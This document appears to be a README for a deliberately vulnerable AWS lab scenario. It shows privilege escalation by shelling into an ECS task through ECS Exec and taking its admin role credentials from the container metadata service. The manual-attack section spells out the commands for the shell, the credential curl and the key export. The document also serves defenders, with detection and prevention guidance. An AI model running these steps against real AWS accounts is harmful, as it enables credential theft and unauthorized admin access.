# Privilege Escalation via ecs:ExecuteCommand + ecs:DescribeTasks

* **Category:** Privilege Escalation
* **Sub-Category:** existing-passrole
* **Path Type:** one-hop
* **Target:** to-admin
* **Environments:** prod
* **Cost Estimate:** $9/mo
* **Pathfinding.cloud ID:** ecs-006
* **Technique:** Shelling into a running ECS task with an admin role to retrieve credentials from the container metadata service
* **Terraform Variable:** `enable_single_account_privesc_one_hop_to_admin_ecs_006_ecs_executecommand_describetasks`
* **Schema Version:** 1.0.0
* **Attack Path:** starting_user → (ecs:ExecuteCommand + ecs:DescribeTasks) → ECS task with admin role → curl metadata → admin credentials
* **Attack Principals:** `arn:aws:iam::{account_id}:user/pl-prod-ecs-006-to-admin-starting-user`; `arn:aws:iam::{account_id}:role/pl-prod-ecs-006-to-admin-target-role`
* **Required Permissions:** `ecs:ExecuteCommand` on `arn:aws:ecs:*:*:task/pl-prod-ecs-006-to-admin-cluster/*`; `ecs:DescribeTasks` on `arn:aws:ecs:*:*:task/pl-prod-ecs-006-to-admin-cluster/*`
* **Helpful Permissions:** `ecs:ListTasks` (Discover task ARNs in the cluster); `ecs:DescribeTaskDefinition` (Get task definition to discover task role ARN); `ecs:ListClusters` (Discover ECS clusters in the account)
* **MITRE Tactics:** TA0004 - Privilege Escalation, TA0006 - Credential Access
* **MITRE Techniques:** T1552.005 - Unsecured Credentials: Cloud Instance Metadata API, T1059 - Command and Scripting Interpreter

## Attack Overview

This scenario demonstrates a privilege escalation vulnerability where a user has permission to execute commands in running ECS containers (`ecs:ExecuteCommand`) and describe tasks (`ecs:DescribeTasks`). Both permissions are required because the AWS CLI internally calls `DescribeTasks` to retrieve the container runtime ID needed to establish the SSM session. When a container is running with a privileged task role attached, an attacker can shell into the container and retrieve the role's temporary credentials from the container metadata service, gaining administrative access.

Unlike new-passrole scenarios where attackers create new resources and pass roles to them, this attack exploits access to an **existing** running ECS task that already has an admin role attached. This represents a common real-world scenario where ECS Exec is enabled for debugging purposes on tasks that run with elevated privileges. The attacker doesn't need to create anything - they simply access what's already running.

The attack works by using `ecs:ExecuteCommand` (powered by AWS Systems Manager Session Manager) to establish an interactive shell session in the running container. Once inside, the attacker queries the container metadata service at `169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` to retrieve the temporary credentials for the task role. These credentials can then be used outside the container to perform administrative actions. This technique is particularly dangerous because ECS Exec is commonly enabled for legitimate troubleshooting purposes, but the security implications of combining it with privileged task roles are often overlooked.

### MITRE ATT&CK Mapping

- **Tactic**: TA0004 - Privilege Escalation
- **Tactic**: TA0006 - Credential Access
- **Technique**: T1552.005 - Unsecured Credentials: Cloud Instance Metadata API
- **Technique**: T1059 - Command and Scripting Interpreter

### Principals in the attack path

- `arn:aws:iam::PROD_ACCOUNT:user/pl-prod-ecs-006-to-admin-starting-user` (Scenario-specific starting user with ecs:ExecuteCommand permission)
- `arn:aws:iam::PROD_ACCOUNT:role/pl-prod-ecs-006-to-admin-target-role` (Admin task role attached to the running ECS task)

### Attack Path Diagram

```mermaid
graph LR
    A[pl-prod-ecs-006-to-admin-starting-user] -->|ecs:ExecuteCommand + ecs:DescribeTasks| B[ECS Task Container]
    B -->|curl metadata service| C[Task Role Credentials]
    C -->|Use credentials| D[pl-prod-ecs-006-to-admin-target-role]
    D -->|Administrator Access| E[Effective Administrator]

    style A fill:#ff9999,stroke:#333,stroke-width:2px
    style B fill:#ffcc99,stroke:#333,stroke-width:2px
    style C fill:#ffcc99,stroke:#333,stroke-width:2px
    style D fill:#ffcc99,stroke:#333,stroke-width:2px
    style E fill:#99ff99,stroke:#333,stroke-width:2px
```



### Attack Steps

1. **Initial Access**: Start as `pl-prod-ecs-006-to-admin-starting-user` (credentials provided via Terraform outputs)
2. **Discover Tasks**: Use `ecs:ListClusters` and `ecs:ListTasks` to identify running tasks with ECS Exec enabled
3. **Execute Command**: Use `ecs:ExecuteCommand` to establish an interactive shell session in the running container
4. **Retrieve Credentials**: Inside the container, query the metadata service: `curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`
5. **Extract Credentials**: Parse the JSON response to extract `AccessKeyId`, `SecretAccessKey`, and `Token`
6. **Verification**: Use the extracted credentials to verify administrator access by listing IAM users

### Scenario specific resources created

| ARN | Purpose |
| -- | -- |
| `arn:aws:iam::PROD_ACCOUNT:user/pl-prod-ecs-006-to-admin-starting-user` | Scenario-specific starting user with access keys and ecs:ExecuteCommand permission |
| `arn:aws:iam::PROD_ACCOUNT:role/pl-prod-ecs-006-to-admin-target-role` | Admin task role with AdministratorAccess attached to the running ECS task |
| `arn:aws:iam::PROD_ACCOUNT:role/pl-prod-ecs-006-to-admin-execution-role` | ECS execution role for pulling images and CloudWatch logging |
| `arn:aws:ecs:REGION:PROD_ACCOUNT:cluster/pl-prod-ecs-006-to-admin-cluster` | ECS cluster hosting the vulnerable task |
| `arn:aws:ecs:REGION:PROD_ACCOUNT:service/pl-prod-ecs-006-to-admin-cluster/pl-prod-ecs-006-to-admin-service` | ECS service that maintains the running task with ECS Exec enabled |

## Attack Lab

### Prerequisites

1. Install the `plabs` CLI:
   ```bash
   brew install pathfinding-labs/tap/plabs
   ```
2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)

### Deploy with plabs non-interactive

```bash
plabs enable enable_single_account_privesc_one_hop_to_admin_ecs_006_ecs_executecommand_describetasks
plabs apply
```

### Deploy with plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `space` to enable it
4. Press `d` to deploy

### Executing the automated demo_attack script

The script will:
1. Display a step-by-step walkthrough with color-coded output
2. Show the commands being executed and their results
3. Verify successful privilege escalation
4. Output standardized test results for automation

#### Resources created by attack script

- No persistent resources are created; the attack only reads credentials from the container metadata service

#### With plabs non-interactive

```bash
plabs demo --list
plabs demo ecs-006-ecs-executecommand+describetasks
```

#### With plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `r` to run the demo script

### Executing the attack manually

For manual exploitation, the key commands are:

```bash
# 1. List clusters to find the target
aws ecs list-clusters

# 2. List tasks in the cluster
aws ecs list-tasks --cluster pl-prod-ecs-006-to-admin-cluster

# 3. Get task details (to find the container name)
aws ecs describe-tasks --cluster pl-prod-ecs-006-to-admin-cluster --tasks <task-arn>

# 4. Execute command to shell into the container
aws ecs execute-command \
    --cluster pl-prod-ecs-006-to-admin-cluster \
    --task <task-arn> \
    --container sleep-container \
    --interactive \
    --command "/bin/sh"

# 5. Inside the container, retrieve credentials
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# 6. Use the credentials (outside the container)
export AWS_ACCESS_KEY_ID="<AccessKeyId from response>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey from response>"
export AWS_SESSION_TOKEN="<Token from response>"

# 7. Verify admin access
aws iam list-users
```

### Cleanup

After demonstrating the attack, there are no persistent artifacts to clean up. The credential retrieval does not create any resources or modify any configurations. The cleanup script will verify the environment state and confirm that no attack artifacts remain.

#### With plabs non-interactive

```bash
plabs cleanup --list
plabs cleanup ecs-006-ecs-executecommand+describetasks
```

#### With plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `c` to run the cleanup script

### Teardown with plabs non-interactive

```bash
plabs disable enable_single_account_privesc_one_hop_to_admin_ecs_006_ecs_executecommand_describetasks
plabs apply
```

### Teardown with plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `space` to disable it
4. Press `D` to destroy

## Detecting Misconfiguration (CSPM)

### What CSPM tools should detect

- ECS services with `enable_execute_command = true` that have task definitions using privileged task roles
- Task roles with administrative or highly privileged permissions attached to tasks in clusters where ECS Exec is enabled
- IAM users or roles with both `ecs:ExecuteCommand` and `ecs:DescribeTasks` permissions on clusters/tasks running with sensitive roles (both are required for exploitation)
- Privilege escalation paths from low-privileged principals through ECS Exec to administrative task roles

### Prevention recommendations

- Disable ECS Exec on production tasks unless absolutely necessary for debugging; use it only on demand and disable immediately after troubleshooting
- Follow the principle of least privilege for ECS task roles - avoid attaching administrative permissions to task roles, even for "internal" services
- Restrict both `ecs:ExecuteCommand` and `ecs:DescribeTasks` permissions using IAM conditions to limit which clusters, services, or tasks can be accessed (both are required for ECS Exec to work)
- Use resource tags and condition keys like `aws:ResourceTag` to control which tasks allow execute command access
- Implement Service Control Policies (SCPs) at the organization level to prevent ECS Exec on sensitive workloads
- Monitor CloudTrail for `ExecuteCommand` API calls and alert on executions targeting tasks with privileged roles
- Enable CloudWatch logging for ECS Exec sessions to capture commands executed within containers
- Use IAM Access Analyzer to identify principals with ecs:ExecuteCommand access to tasks running with elevated permissions
- Implement network segmentation to limit what credentials obtained from ECS tasks can access
- Consider using separate ECS clusters for debugging (with ECS Exec enabled) and production (with ECS Exec disabled)
- Use VPC endpoints for ECS and SSM to ensure Exec traffic doesn't traverse the public internet

## Detection Abuse (CloudSIEM)

### CloudTrail events to monitor

- `ECS: ExecuteCommand` — Interactive shell session established in a running ECS container; critical when the target task has an elevated task role attached
- `ECS: DescribeTasks` — Task details retrieved; required internally by the AWS CLI to establish the SSM session for ECS Exec; correlate with subsequent ExecuteCommand calls

### Detonation logs

_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._
